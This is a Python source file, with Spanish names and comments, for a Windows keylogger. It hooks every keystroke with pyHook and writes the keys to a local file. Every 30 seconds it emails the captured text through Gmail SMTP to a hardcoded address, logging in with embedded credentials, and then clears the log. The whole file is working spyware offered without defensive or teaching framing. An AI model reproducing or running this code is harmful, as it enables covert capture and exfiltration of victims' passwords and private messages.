import pyHook, pythoncom, sys, logging, time, datetime, ctypes

carpeta_destino = 'C:\keylogger\\Key.txt'
segundos_espera = 30
timeout = time.time() + segundos_espera


def TimeOut():
    return time.time() > timeout 
    
def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        
        if data:
            data = data.replace('space',' ')
            data = data.replace('capital','')
            data = data.replace('oem_period', '.')
            data = data.replace('oem_comma', ',')
            data = data.replace('oem_2', '/')
            data = data.replace('oem_5', '\\')
            data = data.replace('lcontrol', '')
            data = data.replace('lshift\n2', '@')
            data = data.replace('lshift', '')
            data = data.replace('\n', '')
            data = 'Mensaje capturado a las: '+ fecha + '\n' + data
            crearEmail('loggerk297@gmail.com', 'izco oikh rppr rmnq', 'loggerk297@gmail.com', fecha, data)
            f.seek(0)
            f.truncate()
            
        else:
            print("No se ha tecleado nada. No se enviará el correo.")

        
def crearEmail(user, passw, recep, subj, body):
    import smtplib
    mailUser = user
    mailPass = passw
    From = user
    To = recep
    Subject = subj
    Txt = body
    
    email = """\From: %s\nTo: %snSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
    
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con exito')
        
    except:
        print('ERROR: Correo fallido.')
        
def get_caps_lock_state():
    return ctypes.windll.user32.GetKeyState(0x14) & 1 != 0

def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)


    # Verificar si la tecla está en mayúsculas
    is_caps_lock = get_caps_lock_state()
    key = event.Key.lower() if not is_caps_lock else event.Key.upper()

    print('Key:', key)
    logging.log(10, key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        EnviarEmail()
        timeout = time.time() + segundos_espera
        
    pythoncom.PumpWaitingMessages()